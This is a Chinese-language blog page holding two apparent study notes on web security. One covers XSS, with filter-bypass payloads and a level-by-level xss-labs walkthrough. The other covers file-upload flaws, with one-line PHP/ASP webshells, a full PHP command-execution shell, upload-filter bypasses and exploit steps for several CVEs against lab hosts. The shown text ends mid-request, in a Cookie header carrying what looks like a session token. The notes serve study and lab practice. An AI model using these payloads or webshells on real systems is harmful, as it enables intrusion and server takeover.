<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Yoghurt</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Yoghurt">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Yoghurt">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="GXY BLOG">
<meta name="twitter:card" content="summary">
  
    <link rel="alternative" href="/atom.xml" title="Yoghurt" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/favicon.ico">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 5.4.1"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/">GXY BLOG</a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">myblog</a></li>
				        
							<li><a href="/archives">overview</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
						<!-- music -->
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">I&#39;m a developer.</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">myblog</a></li>
		        
					<li><a href="/archives">overview</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-xss攻击" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/04/20/xss%E6%94%BB%E5%87%BB/" class="article-date">
  	<time datetime="2022-04-20T07:02:49.235Z" itemprop="datePublished">2022-04-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p>xss全称：cross site scripting，跨站脚本攻击，是web程序中常见的漏洞。<br>攻击者在网页中嵌入客户端脚本（如：javaScript），当用户浏览网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的，比如获取用户的cookie，导航到恶意网站，携带木马等。</p>
<h2 id="xss漏洞分类"><a href="#xss漏洞分类" class="headerlink" title="xss漏洞分类"></a>xss漏洞分类</h2><ul>
<li>反射型xss：存储在URL，插入点为html</li>
<li>存储型xss：存储在后端数据库，插入点为html</li>
<li>dom型xss：存储在URL/后端数据库/前端存储，插入点为js</li>
</ul>
<h3 id="DOM-型xss"><a href="#DOM-型xss" class="headerlink" title="DOM 型xss"></a>DOM 型xss</h3><p>通过URL传入参数去控制触发，其实也属于反射型的xss<br>攻击者构造包含恶意代码的URL–》用户打开url–》用户浏览器前端js取出URL中的恶意代码并执行–》恶意代码窃取用户数据发送到攻击者网站/冒充用户</p>
<h4 id="常用dom方法"><a href="#常用dom方法" class="headerlink" title="常用dom方法"></a>常用dom方法</h4><p><img src="https://s1.328888.xyz/2022/04/24/8Lgsd.png"><br>poc: <code>?massage=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>以锚点的方式提交poc，poc不会发送到服务，但是已经触发了xss</p>
<h3 id="反射型XSS："><a href="#反射型XSS：" class="headerlink" title="反射型XSS："></a>反射型XSS：</h3><p>通过给别人发送带有恶意脚本代码参数的url，当url地址被打开时，特有的恶意代码参数别html解析，执行。<br>特点是非持久化，也不存入网站服务器中。<br>缺点：<br>1.1 必须用户点击带有特定恶意脚本代码参数的链接才能执行<br>1.2 恶意代码存放在url中，只有用户在点击恶意链接的时候才会执行恶意代码，所有它的隐蔽性很差，可以直观的看到访问了怎样的站点，当然不了解的，也不容易看出来。</p>
<h3 id="存储型XSS："><a href="#存储型XSS：" class="headerlink" title="存储型XSS："></a>存储型XSS：</h3><p>恶意语句会进入到目标服务器中，包括但不限于数据库里面，存写进去的方式，比如网站的留言板，个人信息，文章发布等地方，如果这些地方未对传入的数据细致的过滤，就会有储存型XSS的产生。<br>其特点在于，持久性较长，危害性较大。</p>
<h2 id="xss的变形与绕过"><a href="#xss的变形与绕过" class="headerlink" title="xss的变形与绕过"></a>xss的变形与绕过</h2><ol>
<li>没有过滤机制：<script>alert(/xss/)</script></li>
<li>伪协议方式构造xss</li>
</ol>
<ul>
<li>href：<a href="javascript:alert(/xss)">touch me!</a><br>(通过href标签创建超链接，并通过伪协议进行xss攻击，所以点击了超链接就会进行弹窗操作)</li>
<li>imag：<img src="javascript:alert('xss')">(在ie6)</li>
</ul>
<ol start="3">
<li>事件利用：利用HTML中某些动作事件进行响应，通过事件触发js函数，再触发xss<br>如：<ul>
<li><code>&lt;img scr=&#39;./smile.jpg&#39; onmouseover=&#39;alert(/xss/)&#39;&gt;</code><br>这个标签会引入一个图片，当鼠标悬停在图片上的时候，就会触发xss代码</li>
<li> <code>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(/xss/)&quot;&gt;</code><br>当按下键盘任意一个按键时触发</li>
<li> <code> &lt;input type=&quot;text&quot; onkeyup=&quot;alert(/xss/)&quot;&gt;</code><br>当松开键盘任意一个按键时触发</li>
<li><code> &lt;input type=&quot;button&quot; onclick=&quot;alert(/xss/)&quot;&gt;</code><br>当点击按钮时触发</li>
<li><code>&lt;img scr=&quot;#&quot; oneeror=&quot;alert(/xss/)&quot;&gt;</code><br>当img图片载入报错时触发</li>
<li><code>&lt;input onfocus=alert(1)autofocus&gt;</code><br>当input输入框获取焦点时执行一段检js从而触发xss</li>
</ul>
</li>
</ol>
<h2 id="xss的变形与绕过-1"><a href="#xss的变形与绕过-1" class="headerlink" title="xss的变形与绕过"></a>xss的变形与绕过</h2><ol>
<li>左斜线代替空格<br>如：<code>&lt;img/cr=&quot;#&quot;/oneeror=&quot;alert(/xss/)&quot;&gt;</code></li>
<li>回车的使用<br>在一些位置添加水平制表符和回车符，但html中的一些完整的单词不可以拆</li>
<li>对标签的属性值进行转码<br>a的：<br>ascii码：97<br>十进制码：&amp;#97:;<br>十六进制码：&amp;#x61<br>如：<code>&lt;a href=&quot;javascript:alert(/xss)&quot;&gt;touch me!&lt;/a&gt;</code>可以编码为<br><code>&lt;a href=&quot;j&amp;#97;v&amp;#x61;script:alert(/xss)&quot;&gt;touch me!&lt;/a&gt;</code></li>
<li>可以将&amp;#9（水平制表符），&amp;#13（回车）插入到任意位置</li>
<li>拆分跨站<br>当应用程序对字符长度有限制的时候<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&#x27;alert&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;(/xss/)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
<li>双写绕过<br>&lt;scr<script>ipt></li>
</ol>
<h2 id="xss-labs过关教程"><a href="#xss-labs过关教程" class="headerlink" title="xss-labs过关教程"></a>xss-labs过关教程</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>它将name的参数值，插入到了<h2> </h2>标签之间，所以这里直接在name参数<br>中赋值一个简单的弹窗来进行测试<br>name参数重新赋值：<script>alert('xss')</script><br><img src="https://s1.328888.xyz/2022/04/20/ral4Q.png"></p>
<h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>将属性的引号和标签先闭合<br>将keyword的参数值重新赋值”&gt;<script>alert('xss')</script>//<br><img src="https://s1.328888.xyz/2022/04/20/ra5N4.png"></p>
<h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>利用输入框鼠标事件<br>通过<input>标签的一些特殊事件来执行js代码<br>构造代码：level3.php?keyword=’onfocus=javascript:alert(‘xss’) &gt; //&amp;submit=搜索<br>没有直接弹窗，这是因为onfocus事件的特殊性造成的，点击当前页面的输入框就可以完成弹框了<br><img src="https://s1.328888.xyz/2022/04/20/razfB.png"></p>
<h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>第四关跟第三关一样，换成双引号<br><img src="https://s1.328888.xyz/2022/04/20/ra7t7.png"></p>
<h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>onclick被转义了，查看源代码，把on过滤成o_n了<br>可以用另外标签（超链接）来实现<br>输入：”&gt;<a href="javascript:alert(1)">点我<br>然后点击点我超链接<br><img src="https://s1.328888.xyz/2022/04/20/rasGM.png"></p>
<h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>过滤了href，可用大小写绕过。<br>输入：”&gt;<a HrEf="javascript:alert(1)">点我<br><img src="https://s1.328888.xyz/2022/04/20/raccg.png"></p>
<h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>双写绕过，即有些有些检测只检测一次，我们只需要再写一次就可以绕过<br>输入：”&gt;<a hhrefref="javascrscriptipt:alert(1)">点我<br><img src="https://s1.328888.xyz/2022/04/20/ramN1.png"></p>
<h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p>把script过滤成scr_ipt<br>Unicode编码绕过<br>将JavaScript:alert(1)Unicode编码得到&#74;&#97;&#118;&#97;&#83;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<br><img src="https://s1.328888.xyz/2022/04/20/raT4C.png"></p>
<h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p>将JavaScript:alert(1)Unicode编码得到&#74;&#97;&#118;&#97;&#83;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<br>此时发现它说链接不合法，<br>因为添加了检测是否有http://<br>于是我们在后面添加http://，但发现友情链接点击不了<br>原因是http与JavaScript:alert(1)在一起有干扰，注释掉即可<br><img src="https://s1.328888.xyz/2022/04/20/ra3it.png"></p>
<h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p>需要加上type=“text”（详情），来显示搜索框<br>原因：由于hidden函数是隐藏属性不能在页面中触发xss,并且我们使用onclick需要搜索框来触发，所以添加type=”text”让输入框在页面显示<br>输入：<a target="_blank" rel="noopener" href="http://158.247.233.5:8962/level10.php?keyword=wel">http://158.247.233.5:8962/level10.php?keyword=wel</a> done!&amp;t_sort=”type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/rakgq.png"></p>
<h3 id="十一关"><a href="#十一关" class="headerlink" title="十一关"></a>十一关</h3><p>t_sort仍然是接受参数值的，但是里面的双引号被编码了，这样浏览器只能正常显示字符但是却无法起到闭合的作用了。<br>提交：?keyword=good job!&amp;t_link=”type=”text&amp;t_history=”type=”text&amp;t_sort=”type=”text&amp;t_ref=”type=”text<br>burp抓包，加上referer字段：”type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/raKse.png"></p>
<h3 id="十二关"><a href="#十二关" class="headerlink" title="十二关"></a>十二关</h3><p>提交：?keyword=good job!&amp;t_link=”type=”text&amp;t_history=”type=”text&amp;t_sort=”type=”text&amp;t_ref=”type=”text<br>burp抓包，修改user_Agent字段为：”type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/raOVO.png"></p>
<h3 id="十三关"><a href="#十三关" class="headerlink" title="十三关"></a>十三关</h3><p>提交：?keyword=good job!&amp;t_link=”type=”text&amp;t_history=”type=”text&amp;t_sort=”type=”text&amp;t_ref=”type=”text<br>burp抓包，修改cookie字段为：user=call+me+maybe%3F “type=”text” onclick=”alert(1)”<br><img src="https://s1.328888.xyz/2022/04/20/rantP.png"></p>
<h3 id="十五关"><a href="#十五关" class="headerlink" title="十五关"></a>十五关</h3><p>。。。<br>输入：?src=’level1.php?name=<img src=1 onerror=alert(1)>‘<br><img src="https://s1.328888.xyz/2022/04/20/ra1am.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-文件上传漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/04/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
  	<time datetime="2022-04-11T00:48:46.718Z" itemprop="datePublished">2022-04-11</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/04/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
        文件上传漏洞
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="什么的是文件上传漏洞？"><a href="#什么的是文件上传漏洞？" class="headerlink" title="什么的是文件上传漏洞？"></a>什么的是文件上传漏洞？</h2><p>上传一个可执行的脚本文件，从而可以执行服务器端命令</p>
<h2 id="什么叫webshell？"><a href="#什么叫webshell？" class="headerlink" title="什么叫webshell？"></a>什么叫webshell？</h2><p>webshell简称网页后门是运行在web应用之上的远程控制程序，其实就是一张网页，具有文件管理，端口扫描，提权，获取系统信息等功能。</p>
<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p>PHP：<code>&lt;?php @eval($_POST[&quot;&quot;])?&gt;</code><br>asp:<code>&lt;% eval request(&quot;k&quot;)%&gt; </code><br>aspx:<code> &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</code><br>注：@：屏蔽错误<br>    eval():php函数，用于解析字符串形式的代码<br>    $_POST[x]：获取post请求参数中x的值</p>
<h2 id="webshell管理工具"><a href="#webshell管理工具" class="headerlink" title="webshell管理工具"></a>webshell管理工具</h2><p>中国菜刀，中国蚁剑，冰蝎，哥斯拉</p>
<h3 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a>蚁剑安装</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_41924764/article/details/108099952?utm_source=app&app_version=5.1.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">详见</a></p>
<h3 id="冰蝎安装"><a href="#冰蝎安装" class="headerlink" title="冰蝎安装"></a>冰蝎安装</h3><p>github搜索下载运行.jar<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106221602?utm_source=app&app_version=5.1.1&code=app_1562916241&uLinkId=usr1mkqgl919blen">详见</a></p>
<h3 id="将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问"><a href="#将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问" class="headerlink" title="将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问"></a>将木马文件（与服务器相对应）上传到目标服务器，知道其位置，然后去访问</h3><h2 id="webshell变形"><a href="#webshell变形" class="headerlink" title="webshell变形"></a>webshell变形</h2><h2 id="文件上传的机制"><a href="#文件上传的机制" class="headerlink" title="文件上传的机制"></a>文件上传的机制</h2><ul>
<li>客户端JavaScript验证</li>
<li>服务端MIME类型验证</li>
<li>服务端文件扩展名验证（ 黑名单、 白名单 ）</li>
<li>服务器文件内容验证 （ 文件头(文件幻数) 、文件加载检测 ）</li>
</ul>
<h2 id="绕过客户端js验证的方法"><a href="#绕过客户端js验证的方法" class="headerlink" title="绕过客户端js验证的方法"></a>绕过客户端js验证的方法</h2><ul>
<li>修改关键的检测函数</li>
<li>直接通过插件禁用js（JavaScript Switcher，NoScript）</li>
<li>burp抓包修改报文内容<br>（所有前端的验证机制都是不安全的，因为前端的东西是用户可控制的）</li>
</ul>
<h2 id="绕过服务端MIME类型验证"><a href="#绕过服务端MIME类型验证" class="headerlink" title="绕过服务端MIME类型验证"></a>绕过服务端MIME类型验证</h2><h3 id="MIIME是什么？"><a href="#MIIME是什么？" class="headerlink" title="MIIME是什么？"></a>MIIME是什么？</h3><p>MIME即文件类型检测<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p>
<p>浏览器通常使用MIME类型（而不是文件扩展名）来确定如何处理URL，因此Web服务器在响应头中添加正确的MIME类型非常重要。如果配置不正确，浏览器可能会曲解文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。</p>
<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>利用Burp抓包，将报文中的Content-Type改成允许的类型</p>
<h2 id="绕过服务器文件扩展名验证"><a href="#绕过服务器文件扩展名验证" class="headerlink" title="绕过服务器文件扩展名验证"></a>绕过服务器文件扩展名验证</h2><ul>
<li>后缀名大小写绕过</li>
<li>修改后缀名绕过</li>
<li> 重写绕过</li>
<li>特殊可解析后缀绕过（在某些特定环境中某些特殊后缀名仍会被当做PHP文件解析。phplphp2/php3/php4lphp5/php6lphp7/phtlphtm/phtml）</li>
<li> .htaccess绕过</li>
<li> 利用操作系统特性-windos<br>（详见upload过关笔记）<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3>00截断通常用来绕过web软waf的白名单限制<br>00截断是操作系统层的漏洞<br>这两种语言在定义字符串时，都是以\0（即0x00）作为字符串的结尾。操作系统在识别字符串时，当读取到\0字符时，就认为读取到了一个字符串的结束符号。因此，我们可以通过修改数据包，插入\0字符的方式，达到字符串截断的目的。</li>
</ul>
<p>1.在文件名中插入空字符进行00截断，只适合前端绕过，后端绕过无效。<br>具体如：filename=test.php%00.txt<br>2.文件上传是在后缀检测合格后拼接路径和文件名<br>具体如：如果抓到的包中存在path: uploads/，就可以直接把路径构造成uploads/xxx.php%00</p>
<p>0x00和00%00<br>它们最终的结果都是一样的，都代表着chr(0)，即空字符，只不过使用的位置不同，0x00代表16进制的空字符00，需要在HEX中改为00，进行截断，而%00是URL解码之前的字符，它被解码成16进制ASCII码之后实际上也是0x00，所以它们最终都对应的是空字符，这里%00可以用在URL中如xx.php?filename=test.php%00.txt，也可以直接插在Burp包中的路径中，如path=shell.jsp%00.txt</p>
<h2 id="绕过服务器文件内容验证-文件头"><a href="#绕过服务器文件内容验证-文件头" class="headerlink" title="绕过服务器文件内容验证-文件头"></a>绕过服务器文件内容验证-文件头</h2><h3 id="文件幻数"><a href="#文件幻数" class="headerlink" title="文件幻数"></a>文件幻数</h3><p>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。<br>常见文件幻数<br>JPG: FF D8 FF EO 00 10 4A 46 49 46.<br>GIF:47 49 46 3839 61(GIF89a).<br>PNG:89 50 4E 47</p>
<p>给上传脚本加上相应的幻数头字节就可以，php引擎会将GIF89a的内容当作html文本<br>如：GIF89a<?php phpinfo()?><br>但是直接访问并不能将gif当作php来解析,因此还需要利用文件包含漏洞，写一个include.php传入，再利用它来解析图片</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type:text/html;charset-utf-8*);</span><br><span class="line">＄file= $GETI&#x27;file&#x27;]</span><br><span class="line">if (isset($file))&#123;</span><br><span class="line">include $file;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">show source( file_);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<h3 id="图片木马（文件包含漏洞）"><a href="#图片木马（文件包含漏洞）" class="headerlink" title="图片木马（文件包含漏洞）"></a>图片木马（文件包含漏洞）</h3><p>文件包含漏洞：可以将图片格式的文件当做PHP文件来执行</p>
<ul>
<li>准备一张较小的gif格式的图片，上传burp抓包，将一句话木马插入到乱码中</li>
<li>输入系统指令：<code>copy 一张图片.png/b+一句话木马.php/a 生成图片名称.png</code></li>
</ul>
<h4 id="在本地搭建任意文件包含"><a href="#在本地搭建任意文件包含" class="headerlink" title="在本地搭建任意文件包含"></a>在本地搭建任意文件包含</h4><p>PHP中文件包含的函数：</p>
<p>require() // 只在执行到此函数时才去包含文件，若包含的文件不存在产生警告，程序继续运行</p>
<p>require_once() // 如果一个文件已经被包含过，则不会在包含它</p>
<p>include() // 程序一运行文件便会包含进来，若包含文件不存在产生致命错误，程序终止运行</p>
<p>include_once() // 如果一个文件已经被包含过，则不会在包含它</p>
<p>当使用这些函数包含一个新文件时，改文件将作为PHP代码执行</p>
<p>代码：<code>&lt;?php $file=$_GET[&#39;file&#39;];include($file);?&gt; </code><br>本地文件路径：http://本机IP/../include.php?file=</p>
<h1 id="apache-文件上传-CVE-2017-15715"><a href="#apache-文件上传-CVE-2017-15715" class="headerlink" title="apache 文件上传 (CVE-2017-15715)"></a>apache 文件上传 (CVE-2017-15715)</h1><p>访问会发现页面空白，原因是代码中没有上传文件的表单，自行构造一个文件上传的表单即可，代码如下(f12，右键HTML)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">       &lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">           &lt;body&gt;</span><br><span class="line"></span><br><span class="line">               &lt;form action method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">                   &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;</span><br><span class="line"></span><br><span class="line">                   &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">                   &lt;input type=&quot;text&quot; name=&quot;name&quot; &lt;br&gt;</span><br><span class="line"></span><br><span class="line">                   &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line"></span><br><span class="line">               &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">           &lt;/body&gt;</span><br><span class="line"></span><br><span class="line">   &lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>提交木马（不同于一句话木马，这种马可以直接访问）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php#获取网页传递参数</span><br><span class="line">$shell = $_REQUEST[&#x27;shell&#x27;];</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">system($shell, $status);</span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;//注意shell命令的执行结果和执行返回的状态值的对应关系$shell = &quot;&lt;font color=&#x27;red&#x27;&gt;$shell&lt;/font&gt;&quot;;</span><br><span class="line">if( $status )&#123;echo &quot;shell命令&#123;$shell&#125;执行失败&quot;;&#125; </span><br><span class="line">else &#123;echo &quot;shell命令&#123;$shell&#125;成功执行&quot;;&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>将其命名为1.phpa上传改文件使用burp抓包，在hex中将a对应的十六进制改为0a（注意要改下面的那个文件名）发包<br>直接在浏览器中访问tmp：<a href="http://158.247.233.5：64311/1.php%0a?shell=ls/tmp">http://158.247.233.5：64311/1.php%0a?shell=ls/tmp</a><br><img src="https://zhuanlan.zhihu.com/p/261402062" alt="参考教程"><br><img src="https://blog.csdn.net/nzjdsds/article/details/97248241" alt="参考教程"><br><img src="https://cloud.tencent.com/developer/article/1676145" alt="参考教程"></p>
<h1 id="jquery-文件上传-（CVE-2018-9207）"><a href="#jquery-文件上传-（CVE-2018-9207）" class="headerlink" title="jquery 文件上传 （CVE-2018-9207）"></a>jquery 文件上传 （CVE-2018-9207）</h1><p>在kali下  使用curl命令 在当前一句话木马存放的目录中 上传webshell<br>cd进入本地的木马路径执行：curl -F “myfile=@shell.php” “<a target="_blank" rel="noopener" href="http://158.247.233.5:30634/jquery-upload-file/php/upload.php&quot;">http://158.247.233.5:30634/jquery-upload-file/php/upload.php&quot;</a><br>显示：[“shell.php”]<br>上传成功<br>访问tmp：<a target="_blank" rel="noopener" href="http://158.247.233.5:10725/jquery-upload-file/php/uploads/shell.php?shell=ls%20/tmp">http://158.247.233.5:10725/jquery-upload-file/php/uploads/shell.php?shell=ls%20/tmp</a></p>
<h1 id="dedecms-文件上传-（CVE-2019-8933）"><a href="#dedecms-文件上传-（CVE-2019-8933）" class="headerlink" title="dedecms 文件上传 （CVE-2019-8933）"></a>dedecms 文件上传 （CVE-2019-8933）</h1><p><img src="https://www.linuxlz.com/aqld/2600.html" alt="参考教程"></p>
<h1 id="junams-文件上传-（CNVD-2020-24741）"><a href="#junams-文件上传-（CNVD-2020-24741）" class="headerlink" title="junams 文件上传 （CNVD-2020-24741）"></a>junams 文件上传 （CNVD-2020-24741）</h1><p>访问：<a target="_blank" rel="noopener" href="http://158.247.233.5:50097/admin.php">http://158.247.233.5:50097/admin.php</a><br>构造post包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">POST //admin.php/common/add_images.html HTTP/1.1</span><br><span class="line">Host: vulfocus.fofa.so:9461</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------326774743432415414462475084350</span><br><span class="line">Content-Length: 487</span><br><span class="line">Origin: http://vulfocus.fofa.so:9461</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://vulfocus.fofa.so:9461/admin.php/edition/add.html</span><br><span class="line">Cookie: Hm_lvt_deaeca6802357287fb453f342ce28dda=1636957776,1637035618,1637078936,1637219652; Hm_lvt_b5514a35664fd4ac6a893a1e56956c97=1636704940,1636709021,1636825689,1637222671; _ga=GA1.2.744261971.1636781886; Hm_lpvt_deaeca6802357287fb453f342ce28dda=1637221849; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0ODQ1LCJ1c2VybmFtZSI6IllvdXRoQmVsaWVmIiwiZXhwIjoxNjM3MzA2MDA0LCJlbWFpbCI6IjI0NTU1NjQ2NEBxcS5jb20ifQ.4Gr7Mkd6jMvSpaNITDQoww0jUnSP1d59O34IpzyDpmI; PHPSESSID=7jrca24napuo1umgs5s58dfhvu; _gid=GA1.2.277758474.1637219810; ktqnjecmsdodbdata=empirecms; ktqnjeloginlic=empirecmslic; ktqnjloginadminstyleid=1; ktqnjlogintime=1637222551; ktqnjtruelogintime=1637222430; ktqnjloginuserid=1; 